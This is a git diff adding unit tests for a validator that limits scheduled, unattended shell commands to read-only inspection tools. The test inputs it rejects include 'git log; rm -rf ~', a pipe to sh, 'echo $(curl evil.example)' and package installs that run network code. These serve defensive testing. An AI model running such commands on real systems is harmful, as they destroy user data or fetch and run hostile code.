@@ -4,6 +4,7 @@ import {
   ALLOWED_COMMANDS_SORTED,
   DANGEROUS_SHELL_CHARS,
   validateCommand,
+  validateUnattendedCommand,
   validatePm2Command,
   redactOutput,
   parseCommandArgs
@@ -285,6 +286,74 @@ describe('commandSecurity', () => {
       expect(validatePm2Command(['kill']).valid).toBe(false)
       expect(validatePm2Command(['restart', 'my-app']).valid).toBe(true)
       expect(validatePm2Command(['delete', 'all']).valid).toBe(false)
+    })
+  })
+
+  describe('validateUnattendedCommand (#5669)', () => {
+    // The unattended lane (Layered Intelligence `cmd` sources) runs persistent,
+    // attacker-reachable config on a schedule with nobody watching. Binaries that
+    // fetch and execute network code carry NO shell metacharacter, so the
+    // metacharacter filter alone does not stop them — the narrower allowlist must.
+    it.each([
+      ['npx runs an arbitrary package straight off the network', 'npx some-package'],
+      ['curl writes an arbitrary file', 'curl https://example.com -o /tmp/x'],
+      ['pip install runs a setup script', 'pip install evil'],
+      ['pip3 install runs a setup script', 'pip3 install evil'],
+      ['node executes a script', 'node evil.js'],
+      ['python executes a script', 'python evil.py'],
+      ['wget downloads to disk', 'wget https://example.com/x'],
+      ['brew installs software', 'brew install evil'],
+      ['make runs a Makefile target', 'make install'],
+      ['npm runs lifecycle scripts', 'npm install'],
+      ['pm2 is not on the unattended list at all', 'pm2 list'],
+    ])('rejects %s', (_label, cmd) => {
+      const result = validateUnattendedCommand(cmd)
+      expect(result.valid).toBe(false)
+      expect(result.error).toMatch(/not in the allowlist/)
+    })
+
+    it.each([
+      'git log --oneline -20',
+      'gh pr list',
+      'glab mr list',
+      'cat README.md',
+      'head -n 20 README.md',
+      'grep -rn TODO src',
+      'wc -l README.md',
+      'pwd',
+    ])('accepts read-only inspection command %s', (cmd) => {
+      expect(validateUnattendedCommand(cmd).valid).toBe(true)
+    })
+
+    it('parses args the same way as validateCommand', () => {
+      const result = validateUnattendedCommand('git log --grep "two words"')
+      expect(result.valid).toBe(true)
+      expect(result.baseCommand).toBe('git')
+      expect(result.args).toEqual(['log', '--grep', 'two words'])
+    })
+
+    it.each([
+      'git log | sh',
+      'git log; rm -rf ~',
+      'echo $(curl evil.example)',
+    ])('rejects shell metacharacters in %s', (cmd) => {
+      const result = validateUnattendedCommand(cmd)
+      expect(result.valid).toBe(false)
+      expect(result.error).toMatch(/disallowed shell characters/)
+    })
+
+    it.each([
+      ['', 'Command is required'],
+      ['   ', 'Command cannot be empty'],
+    ])('rejects blank input %j', (cmd, error) => {
+      expect(validateUnattendedCommand(cmd).error).toBe(error)
+    })
+
+    it('leaves the operator-facing runner untouched', () => {
+      // POST /api/commands/execute must behave identically — a human triggers it.
+      expect(validateCommand('npx vitest').valid).toBe(true)
+      expect(validateCommand('curl https://example.com').valid).toBe(true)
+      expect(validateCommand('pip install requests').valid).toBe(true)
     })
   })
 })
